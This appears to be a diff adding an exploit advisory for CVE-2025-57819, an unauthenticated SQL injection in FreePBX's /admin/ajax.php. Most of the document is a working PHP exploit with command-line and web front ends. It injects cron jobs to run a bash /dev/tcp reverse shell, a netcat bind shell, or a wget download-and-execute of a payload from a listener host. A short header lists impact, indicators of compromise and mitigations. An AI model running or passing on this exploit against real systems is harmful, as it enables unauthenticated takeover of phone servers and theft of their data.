@@ -1,0 +1,586 @@
+=============================================================================================================================================
+| # Title     : FreePBX 17.0.3 Unauthenticated SQL Injection in ajax.php                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.freepbx.org/                                                                                                    |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/209776/ & 	CVE-2025-57819
+
+[+] Summary : 
+          
+    SQL Injection Point: brand parameter in /admin/ajax.php
+    Database Access: FreePBX database user has privileges to modify cron jobs
+    Cronjob Execution: Injected cron jobs are executed by the system
+    Command Execution: Arbitrary commands executed via cron
+
+[+] Key Features
+
+    Unauthenticated Access: No credentials required
+    Automatic Cleanup: Removes created cron jobs after execution
+    Multiple Payloads: Support for various payload types
+    Web Interface: User-friendly web interface for testing
+    Vulnerability Checking: Automated detection of vulnerable systems
+
+[+] Payload Types
+
+    Command Execution: Basic system commands
+    Reverse Shell: Connect back to attacker machine
+    Bind Shell: Open listening port on target
+    Meterpreter: Advanced payload delivery
+
+[+] Security Impact
+
+    Complete system compromise
+    Unauthorized access to telephony infrastructure
+    Data exfiltration capabilities
+    Persistence establishment
+    Lateral movement opportunities
+
+[+] Indicators of Compromise:
+
+    Unusual cron job entries
+    SQL errors in web logs
+    Unexpected network connections
+    Modified database entries
+
+[+] Mitigation Steps:
+
+    Update to FreePBX 15.0.66, 16.0.89, or 17.0.3
+    Implement web application firewall rules
+    Restrict access to admin interfaces
+    Monitor cron job modifications
+    Regular security assessments
+	
+[+]  POC : 
+
+php poc.php  or http://127.0.0.1/poc.php 
+
+<?php
+/*
+ * FreePBX ajax.php unauthenticated SQLi to RCE
+ * by indoushka
+ * based on Metasploit module
+ */
+
+class FreePBXExploit {
+    private $target;
+    private $port;
+    private $ssl;
+    private $base_path;
+    private $timeout;
+    private $job_name;
+    
+    public function __construct($target, $port = 80, $ssl = false, $base_path = '/') {
+        $this->target = $target;
+        $this->port = $port;
+        $this->ssl = $ssl;
+        $this->base_path = rtrim($base_path, '/');
+        $this->timeout = 30;
+        $this->job_name = null;
+    }
+    
+    /**
+     * Check if target is vulnerable
+     */
+    public function check() {
+        echo "[*] Checking FreePBX vulnerability...\n";
+        
+        $random_str = $this->random_text(4);
+        $payload = $random_str . "'";
+        
+        $response = $this->send_ajax_request($payload);
+        
+        if ($response && $response['code'] == 500) {
+            if (strpos($response['body'], 'You have an error in your SQL syntax') !== false) {
+                echo "[+] ✓ Target is vulnerable - SQL injection detected\n";
+                return "vulnerable";
+            } elseif (strpos($response['body'], 'Trying to access array offset on value of type bool') !== false) {
+                echo "[+] ✓ Target is vulnerable - Error-based SQLi confirmed\n";
+                return "vulnerable";
+            }
+        }
+        
+        echo "[-] ✗ Target is not vulnerable or patched\n";
+        return "safe";
+    }
+    
+    /**
+     * Execute the exploit
+     */
+    public function exploit($payload_type = 'reverse_shell', $lhost = null, $lport = null) {
+        echo "[*] Starting FreePBX exploitation...\n";
+        
+        // Generate random names
+        $module_name = $this->random_text(6);
+        $this->job_name = $this->random_text(6);
+        
+        // Generate payload command
+        $command = $this->generate_payload($payload_type, $lhost, $lport);
+        
+        if (!$command) {
+            echo "[-] Failed to generate payload\n";
+            return false;
+        }
+        
+        echo "[*] Generated command: " . htmlspecialchars($command) . "\n";
+        
+        // Build SQL injection payload
+        $sql_payload = "';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) ";
+        $sql_payload .= "VALUES ('{$module_name}','{$this->job_name}','{$command}',NULL,'* * * * *',30,1,1) -- ";
+        
+        echo "[*] Sending SQL injection payload...\n";
+        
+        $response = $this->send_ajax_request($sql_payload);
+        
+        if ($response && $response['code'] == 500) {
+            if (strpos($response['body'], 'Trying to access array offset on value of type bool') !== false) {
+                echo "[+] ✓ Successfully created cronjob: '{$this->job_name}'\n";
+                echo "[*] Waiting for cronjob to trigger (up to 60 seconds)...\n";
+                
+                // Wait for execution
+                sleep(70);
+                return true;
+            }
+        }
+        
+        echo "[-] Failed to create cronjob\n";
+        return false;
+    }
+    
+    /**
+     * Clean up created cronjob
+     */
+    public function cleanup() {
+        if (!$this->job_name) {
+            echo "[-] No cronjob to clean up\n";
+            return false;
+        }
+        
+        echo "[*] Attempting to clean up cronjob: '{$this->job_name}'\n";
+        
+        $cleanup_payload = "'; DELETE FROM cron_jobs WHERE jobname='{$this->job_name}' -- ";
+        
+        $response = $this->send_ajax_request($cleanup_payload);
+        
+        if ($response && $response['code'] == 500) {
+            if (strpos($response['body'], 'Trying to access array offset on value of type bool') !== false) {
+                echo "[+] ✓ Cronjob removed successfully\n";
+                $this->job_name = null;
+                return true;
+            }
+        }
+        
+        echo "[-] Failed to remove cronjob - manual cleanup required\n";
+        return false;
+    }
+    
+    /**
+     * Send AJAX request with SQL injection payload
+     */
+    private function send_ajax_request($brand_payload) {
+        $url = $this->build_url('/admin/ajax.php');
+        
+        $params = [
+            'module' => 'FreePBX\\modules\\endpoint\\ajax',
+            'command' => 'model',
+            'template' => $this->random_text(5),
+            'model' => $this->random_text(5),
+            'brand' => $brand_payload
+        ];
+        
+        $query_string = http_build_query($params);
+        $full_url = $url . '?' . $query_string;
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $full_url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            CURLOPT_HEADER => true
+        ]);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($response) {
+            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+            $headers = substr($response, 0, $header_size);
+            $body = substr($response, $header_size);
+            
+            return [
+                'code' => $http_code,
+                'headers' => $headers,
+                'body' => $body
+            ];
+        }
+        
+        return false;
+    }
+    
+    /**
+     * Generate different payloads
+     */
+    private function generate_payload($type, $lhost, $lport) {
+        switch ($type) {
+            case 'reverse_shell':
+                if (!$lhost || !$lport) {
+                    echo "[-] IP and port required for reverse shell\n";
+                    return false;
+                }
+                // Bash reverse shell
+                return "bash -c 'bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1'";
+                
+            case 'bind_shell':
+                if (!$lport) {
+                    echo "[-] Port required for bind shell\n";
+                    return false;
+                }
+                return "nc -lvp {$lport} -e /bin/bash";
+                
+            case 'command':
+                return 'id; whoami; uname -a; pwd';
+                
+            case 'meterpreter':
+                if (!$lhost || !$lport) {
+                    echo "[-] IP and port required for meterpreter\n";
+                    return false;
+                }
+                // This would typically download and execute a meterpreter payload
+                return "wget http://{$lhost}:8080/payload.elf -O /tmp/payload.elf && chmod +x /tmp/payload.elf && /tmp/payload.elf";
+                
+            default:
+                return 'id; whoami';
+        }
+    }
+    
+    /**
+     * Generate random text
+     */
+    private function random_text($length = 6) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        return $result;
+    }
+    
+    /**
+     * Build full URL
+     */
+    private function build_url($path) {
+        $protocol = $this->ssl ? 'https' : 'http';
+        $full_path = $this->base_path . $path;
+        return "{$protocol}://{$this->target}:{$this->port}{$full_path}";
+    }
+    
+    /**
+     * Destructor - auto cleanup
+     */
+    public function __destruct() {
+        if ($this->job_name) {
+            $this->cleanup();
+        }
+    }
+}
+
+// CLI Interface
+if (php_sapi_name() === 'cli') {
+    echo "
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                  FreePBX RCE Exploit                         ║
+    ║                     CVE-2025-57819                           ║
+    ║                     PHP Implementation                       ║
+    ╚══════════════════════════════════════════════════════════════╝
+    
+    \n";
+    
+    $options = getopt("t:p:s:u:c:P:L:H:", [
+        "target:",
+        "port:",
+        "ssl",
+        "uri:",
+        "check",
+        "payload:",
+        "lhost:",
+        "lport:"
+    ]);
+    
+    $target = $options['t'] ?? $options['target'] ?? null;
+    $port = $options['p'] ?? $options['port'] ?? 80;
+    $ssl = isset($options['s']) || isset($options['ssl']);
+    $base_uri = $options['u'] ?? $options['uri'] ?? '/';
+    $check_only = isset($options['c']) || isset($options['check']);
+    $payload_type = $options['P'] ?? $options['payload'] ?? 'command';
+    $lhost = $options['H'] ?? $options['lhost'] ?? null;
+    $lport = $options['L'] ?? $options['lport'] ?? 4444;
+    
+    if (!$target) {
+        echo "Usage: php freepbx_exploit.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target    Target host (required)\n";
+        echo "  -p, --port      Target port (default: 80)\n";
+        echo "  -s, --ssl       Use SSL (default: false)\n";
+        echo "  -u, --uri       Base URI path (default: /)\n";
+        echo "  -c, --check     Check only (don't exploit)\n";
+        echo "  -P, --payload   Payload type: command, reverse_shell, bind_shell, meterpreter (default: command)\n";
+        echo "  -H, --lhost     Listener host for reverse shell\n";
+        echo "  -L, --lport     Listener port for reverse shell (default: 4444)\n";
+        echo "\nExamples:\n";
+        echo "  php freepbx_exploit.php -t 192.168.1.100 -c\n";
+        echo "  php freepbx_exploit.php -t freepbx.company.com -P reverse_shell -H 10.0.0.5 -L 4444\n";
+        exit(1);
+    }
+    
+    $exploit = new FreePBXExploit($target, $port, $ssl, $base_uri);
+    
+    if ($check_only) {
+        $result = $exploit->check();
+        echo "\n[*] Result: {$result}\n";
+    } else {
+        if ($exploit->exploit($payload_type, $lhost, $lport)) {
+            echo "[+] Exploitation completed successfully\n";
+        } else {
+            echo "[-] Exploitation failed\n";
+        }
+    }
+    
+} else {
+    // Web Interface
+    $action = $_POST['action'] ?? '';
+    
+    if ($action === 'check' || $action === 'exploit') {
+        $target = $_POST['target'] ?? '';
+        $port = $_POST['port'] ?? 80;
+        $ssl = isset($_POST['ssl']);
+        $base_uri = $_POST['uri'] ?? '/';
+        $payload_type = $_POST['payload_type'] ?? 'command';
+        $lhost = $_POST['lhost'] ?? '';
+        $lport = $_POST['lport'] ?? 4444;
+        
+        if (empty($target)) {
+            echo "<div style='color: red; padding: 10px; border: 1px solid red; margin: 10px;'>Target host is required</div>";
+        } else {
+            $exploit = new FreePBXExploit($target, $port, $ssl, $base_uri);
+            
+            ob_start();
+            if ($action === 'check') {
+                $exploit->check();
+            } else {
+                $exploit->exploit($payload_type, $lhost, $lport);
+            }
+            $output = ob_get_clean();
+            
+            echo "<pre style='background: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
+            
+            // Show cleanup option
+            if ($action === 'exploit') {
+                echo '<form method="post" style="margin-top: 20px;">
+                    <input type="hidden" name="target" value="' . htmlspecialchars($target) . '">
+                    <input type="hidden" name="port" value="' . htmlspecialchars($port) . '">
+                    <input type="hidden" name="uri" value="' . htmlspecialchars($base_uri) . '">
+                    ' . ($ssl ? '<input type="hidden" name="ssl" value="1">' : '') . '
+                    <button type="submit" name="action" value="cleanup" style="background: #ffc107; color: black; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;">Clean Up Cronjob</button>
+                </form>';
+            }
+        }
+        
+        // Show back link
+        echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" style="display: inline-block; padding: 10px 20px; background: #007cba; color: white; text-decoration: none; border-radius: 4px; margin: 10px 0;">Back to Form</a>';
+        
+    } elseif ($action === 'cleanup') {
+        $target = $_POST['target'] ?? '';
+        $port = $_POST['port'] ?? 80;
+        $ssl = isset($_POST['ssl']);
+        $base_uri = $_POST['uri'] ?? '/';
+        
+        if (empty($target)) {
+            echo "<div style='color: red;'>Target host is required</div>";
+        } else {
+            $exploit = new FreePBXExploit($target, $port, $ssl, $base_uri);
+            
+            ob_start();
+            $exploit->cleanup();
+            $output = ob_get_clean();
+            
+            echo "<pre style='background: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
+            echo '<a href="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" style="display: inline-block; padding: 10px 20px; background: #007cba; color: white; text-decoration: none; border-radius: 4px; margin: 10px 0;">Back to Form</a>';
+        }
+    } else {
+        // Display the form
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>FreePBX RCE Exploit - CVE-2025-57819</title>
+            <meta charset="UTF-8">
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 0; 
+                    padding: 20px; 
+                    background: #f5f5f5;
+                }
+                .container { 
+                    max-width: 800px; 
+                    margin: 0 auto; 
+                    background: white;
+                    padding: 30px;
+                    border-radius: 8px;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                }
+                h1 { 
+                    color: #333; 
+                    border-bottom: 2px solid #007cba;
+                    padding-bottom: 10px;
+                }
+                h3 {
+                    color: #666;
+                }
+                .form-group { 
+                    margin-bottom: 20px; 
+                }
+                label { 
+                    display: block; 
+                    margin-bottom: 8px; 
+                    font-weight: bold;
+                    color: #333;
+                }
+                input[type="text"], select { 
+                    width: 100%; 
+                    padding: 10px; 
+                    border: 1px solid #ddd; 
+                    border-radius: 4px; 
+                    box-sizing: border-box;
+                    font-size: 14px;
+                }
+                .checkbox-group {
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                }
+                button { 
+                    background: #007cba; 
+                    color: white; 
+                    padding: 12px 25px; 
+                    border: none; 
+                    border-radius: 4px; 
+                    cursor: pointer; 
+                    margin-right: 10px;
+                    font-size: 16px;
+                    transition: background 0.3s;
+                }
+                button:hover {
+                    background: #005a87;
+                }
+                .danger { 
+                    background: #dc3545; 
+                }
+                .danger:hover {
+                    background: #c82333;
+                }
+                .info { 
+                    background: #17a2b8; 
+                }
+                .info:hover {
+                    background: #138496;
+                }
+                .warning-box {
+                    background: #fff3cd;
+                    border: 1px solid #ffeaa7;
+                    color: #856404;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+                .info-box {
+                    background: #d1ecf1;
+                    border: 1px solid #bee5eb;
+                    color: #0c5460;
+                    padding: 15px;
+                    border-radius: 4px;
+                    margin: 20px 0;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>FreePBX RCE Exploit</h1>
+                <h3>CVE-2025-57819 - Unauthenticated SQL Injection to RCE</h3>
+                
+                <div class="warning-box">
+                    <strong>⚠️ Educational Use Only:</strong> This tool demonstrates a critical vulnerability in FreePBX.
+                    Use only on systems you own or have explicit permission to test.
+                </div>
+                
+                <form method="post">
+                    <div class="form-group">
+                        <label for="target">Target Host:</label>
+                        <input type="text" id="target" name="target" placeholder="192.168.1.100 or freepbx.company.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="port">Port:</label>
+                        <input type="text" id="port" name="port" value="80">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="uri">Base URI:</label>
+                        <input type="text" id="uri" name="uri" value="/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="ssl" name="ssl">
+                            <label for="ssl" style="display: inline; font-weight: normal;">Use SSL</label>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="payload_type">Payload Type:</label>
+                        <select id="payload_type" name="payload_type">
+                            <option value="command">Test Command (id; whoami)</option>
+                            <option value="reverse_shell">Reverse Shell</option>
+                            <option value="bind_shell">Bind Shell</option>
+                            <option value="meterpreter">Meterpreter</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lhost">Listener Host (for reverse shell):</label>
+                        <input type="text" id="lhost" name="lhost" placeholder="Your IP address: 192.168.1.100">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lport">Listener Port (for reverse shell):</label>
+                        <input type="text" id="lport" name="lport" value="4444">
+                    </div>
+                    
+                    <button type="submit" name="action" value="check" class="info">Check Vulnerability</button>
+                    <button type="submit" name="action" value="exploit" class="danger">Execute Exploit</button>
+                </form>
+                
+                <div class="info-box">
+                    <h3>About CVE-2025-57819:</h3>
+                    <p><strong>Vulnerability:</strong> Unauthenticated SQL Injection in ajax.php</p>
+                    <p><strong>Affected Versions:</strong> FreePBX prior to 15.0.66, 16.0.89, 17.0.3</p>
+                    <p><strong>Endpoint:</strong> /admin/ajax.php</p>
+                    <p><strong>Impact:</strong> Remote Code Execution via cronjob injection</p>
+                    <p><strong>CVSS Score:</strong> 9.8 (Critical)</p>
+                    <p><strong>Exploit Chain:</strong> SQL Injection → Cronjob Creation → RCE</p>
+                </div>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
